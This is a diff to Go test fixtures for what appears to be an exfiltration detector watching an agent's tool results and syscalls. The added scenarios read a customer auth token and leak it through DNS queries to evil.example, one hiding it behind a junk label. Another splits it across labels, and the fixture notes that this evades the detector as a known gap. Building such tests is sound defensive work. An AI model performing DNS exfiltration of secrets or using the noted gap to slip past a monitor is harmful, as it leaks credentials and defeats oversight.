@@ -202,6 +202,21 @@ func maliciousShouldDetect() []Scenario {
 		})
 	}
 
+	{
+		id := "malicious_ebpf_b_dns_junk_label"
+		out = append(out, Scenario{
+			ID:          id,
+			Description: "secret in the second DNS label behind a junk leading label (review #16) — should trip EXFIL",
+			Category:    Malicious,
+			Variant:     VariantEbpfB,
+			Steps: []Step{
+				resultStep(sid(id), "read_ticket", "tickets", nextSeq(), ticketResult("Customer auth token: "+secret)),
+				syscallStep(sid(id), "dns", "8.8.8.8", 53, 4246, "exfil",
+					"", "junk."+secret+".evil.example"),
+			},
+		})
+	}
+
 	// --- Sensor-only (v0.3 Phase 1): openat seeds taint, write egress proves EXFIL ---
 	{
 		id := "malicious_sensor_b_openat_write_exfil"
@@ -504,6 +519,20 @@ func maliciousKnownGap() []Scenario {
 					"", secret[22:34]+".exfil.evil.example"),
 				syscallStep(sid("malicious_gap_egress_cross_destination_split"), "dns", "1.1.1.1", 53, 8801, "exfil",
 					"", secret[34:]+".exfil.evil.example"),
+			},
+		},
+		{
+			ID:          "malicious_gap_dns_label_split",
+			Description: "secret split across two labels of one DNS query; labels are not joined within a query",
+			Category:    Malicious,
+			Variant:     VariantEbpfB,
+			KnownGap:    true,
+			GapNote:     "TestEgressReassembly_DNSSecretSplitAcrossLabels_KnownGap — the raw dotted query and the first-label reassembly window are scanned; labels of one query are not concatenated.",
+			Steps: []Step{
+				resultStep(sid("malicious_gap_dns_label_split"), "read_ticket", "tickets", nextSeq(),
+					ticketResult("Customer auth token: "+secret)),
+				syscallStep(sid("malicious_gap_dns_label_split"), "dns", "8.8.8.8", 53, 8803, "exfil",
+					"", secret[:20]+"."+secret[20:]+".evil.example"),
 			},
 		},
 		{
